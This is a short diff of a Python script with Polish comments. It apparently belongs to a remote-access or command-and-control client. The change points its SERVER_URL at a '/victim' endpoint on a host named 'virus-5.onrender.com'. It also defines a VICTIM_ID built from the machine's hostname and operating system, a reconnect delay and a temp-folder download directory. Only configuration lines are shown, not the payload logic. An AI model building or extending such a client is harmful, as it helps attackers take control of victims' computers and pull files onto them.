@@ -17,7 +17,7 @@ except ImportError:
     from websocket import create_connection, WebSocketConnectionClosedException
 
 # ─── Konfiguracja ───────────────────────────────────────────────
-SERVER_URL = "wss://virus-5.onrender.com"
+SERVER_URL = "wss://virus-5.onrender.com/victim"
 VICTIM_ID = f"{socket.gethostname()}-{platform.system()}"
 RECONNECT_DELAY = 5
 DOWNLOAD_DIR = tempfile.gettempdir()  # Folder na pobrane pliki
